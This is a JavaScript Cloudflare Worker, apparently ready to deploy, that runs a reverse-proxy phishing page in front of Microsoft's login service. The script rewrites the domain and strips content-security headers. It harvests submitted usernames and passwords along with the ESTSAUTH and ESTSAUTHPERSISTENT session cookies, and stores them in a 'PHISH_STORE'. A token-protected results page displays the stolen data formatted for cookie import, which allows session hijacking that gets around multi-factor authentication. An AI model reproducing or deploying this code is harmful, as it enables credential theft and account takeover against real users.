// ============================================================
// STEP 1 — ONLY EDIT THIS LINE
// Replace the placeholder with the token you generated in PowerShell (New-Guid).
// Visit /cookie on your worker URL to view captured data.
// ============================================================
const secret_token = "<YOUR_SECRET_TOKEN>"
// ============================================================
// You do NOT need to change anything below this line.
// ============================================================

// Microsoft
const upstream = 'login.microsoftonline.com'
const upstream_path = '/'
const https = true

// Blocking
const blocked_region = []
const blocked_ip_address = ['0.0.0.0', '127.0.0.1']

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})

async function fetchAndApply(request) {
    const url = new URL(request.url);

    if (url.pathname === '/results') {
        return handleResults(url);
    }

    if (url.pathname === '/cookie') {
        return Response.redirect(`${url.origin}/results?token=${secret_token}`, 302);
    }

    const region = request.headers.get('cf-ipcountry').toUpperCase();
    const ip_address = request.headers.get('cf-connecting-ip');

    let all_cookies = ""
    let response = null;
    let url_hostname = url.hostname;

    if (https == true) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    var upstream_domain = upstream;
    url.host = upstream_domain;

    if (url.pathname == '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    if (blocked_region.includes(region)) {
        response = new Response('Access denied.', {
            status: 403
        });
    } else if (blocked_ip_address.includes(ip_address)) {
        response = new Response('Access denied', {
            status: 403
        });
    } else {
        let method = request.method;
        let request_headers = request.headers;
        let new_request_headers = new Headers(request_headers);

        new_request_headers.set('Host', upstream_domain);
        new_request_headers.set('Referer', url.protocol + '//' + url_hostname);

        if (request.method === 'POST') {
            const temp_req = await request.clone();
            var body = await temp_req.text()
            const keyValuePairs = body.split('&');
            let captured = { username: null, password: null };

            for (const pair of keyValuePairs) {
                const [key, value] = pair.split('=');
                if (key === 'login') {
                    captured.username = decodeURIComponent(value.replace(/\+/g, ' '));
                }
                if (key === 'passwd') {
                    captured.password = decodeURIComponent(value.replace(/\+/g, ' '));
                }
            }
            if (captured.username && captured.password) {
                await PHISH_STORE.put('credentials', JSON.stringify(captured), { expirationTtl: 600 });
            }
        }

        let original_response = await fetch(url.href, {
            method: method,
            headers: new_request_headers,
            body: request.body
        })

        connection_upgrade = new_request_headers.get("Upgrade");
        if (connection_upgrade && connection_upgrade.toLowerCase() == "websocket") {
            return original_response;
        }

        let original_response_clone = original_response.clone();
        let original_text = null;
        let response_headers = original_response.headers;
        let new_response_headers = new Headers(response_headers);
        let status = original_response.status;

        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');

        try {
            const originalCookies = new_response_headers.getAll("Set-Cookie");
            const targetCookies = ['ESTSAUTH', 'ESTSAUTHPERSISTENT'];
            const captured = [];

            originalCookies.forEach(originalCookie => {
                const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
                new_response_headers.append("Set-Cookie", modifiedCookie);
                if (targetCookies.some(name => originalCookie.startsWith(name + '='))) {
                    captured.push(parseSetCookie(originalCookie));
                }
            });
            if (captured.length > 0) {
                all_cookies = JSON.stringify(captured, null, 2);
            }
        } catch (error) {
            console.error(error);
        }

        original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);

        if (all_cookies) {
            await PHISH_STORE.put('cookies', all_cookies, { expirationTtl: 600 });
        }

        response = new Response(original_text, {
            status,
            headers: new_response_headers
        })
    }
    return response;
}

async function handleResults(url) {
    const token = url.searchParams.get('token');
    if (token !== secret_token) {
        return new Response('Unauthorized', { status: 401 });
    }

    const credentials = await PHISH_STORE.get('credentials');
    const cookies = await PHISH_STORE.get('cookies');
    const creds = credentials ? JSON.parse(credentials) : null;
    const cookieList = cookies ? JSON.parse(cookies) : [];

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Results</title>
  <style>
    body { font-family: monospace; background: #1a1a1a; color: #e0e0e0; padding: 2rem; max-width: 900px; margin: 0 auto; }
    h2 { color: #ff4444; }
    h3 { color: #aaa; border-bottom: 1px solid #333; padding-bottom: 0.3rem; }
    .box { background: #2a2a2a; border: 1px solid #444; border-radius: 6px; padding: 1rem; margin: 1rem 0; white-space: pre-wrap; word-break: break-all; }
    .empty { color: #666; font-style: italic; }
    .label { color: #ff9900; font-weight: bold; }
    .note { color: #888; font-size: 0.9rem; }
  </style>
</head>
<body>
  <h2>Captured Results</h2>
  <p class="note">Results expire 10 minutes after capture. Refresh to check for new data.</p>

  <h3>Credentials</h3>
  ${creds
    ? `<div class="box"><span class="label">Username: </span>${creds.username}\n<span class="label">Password: </span>${creds.password}</div>`
    : `<div class="box empty">No credentials captured yet.</div>`}

  <h3>Session Cookies — Cookie-Editor JSON</h3>
  <p class="note">Open Cookie-Editor → Import → paste the JSON below.</p>
  ${cookies
    ? `<div class="box">${cookies}</div>`
    : `<div class="box empty">No cookies captured yet.</div>`}

  <h3>Session Cookies — Individual values</h3>
  <p class="note">For manual import via DevTools — copy each value separately.</p>
  ${cookieList.length > 0
    ? cookieList.map(c => `<div class="box"><span class="label">${c.name}</span><br>${c.value}</div>`).join('')
    : `<div class="box empty">No cookies captured yet.</div>`}
</body>
</html>`;

    return new Response(html, {
        status: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
}

function parseSetCookie(header) {
    const parts = header.split(';').map(p => p.trim());
    const eqIdx = parts[0].indexOf('=');
    const name = parts[0].substring(0, eqIdx).trim();
    const value = parts[0].substring(eqIdx + 1);
    const cookie = { name, value, domain: 'login.microsoftonline.com', path: '/', secure: false, httpOnly: false, sameSite: 'Lax' };
    for (let i = 1; i < parts.length; i++) {
        const lower = parts[i].toLowerCase();
        if (lower === 'secure') { cookie.secure = true; }
        else if (lower === 'httponly') { cookie.httpOnly = true; }
        else if (lower.startsWith('path=')) { cookie.path = parts[i].slice(5); }
        else if (lower.startsWith('domain=')) { cookie.domain = parts[i].slice(7).replace(/^\./, ''); }
        else if (lower.startsWith('samesite=')) {
            const v = parts[i].slice(9).toLowerCase();
            cookie.sameSite = v === 'none' ? 'no_restriction' : v === 'strict' ? 'strict' : 'lax';
        }
        else if (lower.startsWith('expires=')) {
            const d = new Date(parts[i].slice(8));
            if (!isNaN(d)) cookie.expirationDate = Math.floor(d.getTime() / 1000);
        }
    }
    return cookie;
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text()
    let re = new RegExp(upstream_domain, 'g')
    text = text.replace(re, host_name);
    return text;
}
